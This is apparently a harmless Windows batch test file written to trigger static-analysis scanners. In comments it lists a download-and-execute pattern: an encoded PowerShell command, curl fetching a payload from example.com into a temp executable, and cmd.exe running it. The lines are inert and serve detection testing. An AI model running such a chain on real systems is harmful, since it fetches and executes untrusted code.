@echo off
REM ===== TEST FILE - SUSPICIOUS DEMO =====
REM This file is created ONLY for demonstration purposes.
REM It contains suspicious keywords to trigger analysis.

echo Starting process...

REM These strings trigger static analysis flags:
set ENCODED=aGVsbG93b3JsZA==
set EXEC_PATH=%TEMP%\runner.exe
set DOWNLOAD_URL=http://example.com/payload

REM Suspicious patterns (demo only - no real code):
REM powershell -EncodedCommand %ENCODED%
REM curl %DOWNLOAD_URL% -o %EXEC_PATH%
REM cmd.exe /c %EXEC_PATH%

echo Demo complete. This file does nothing harmful.
pause
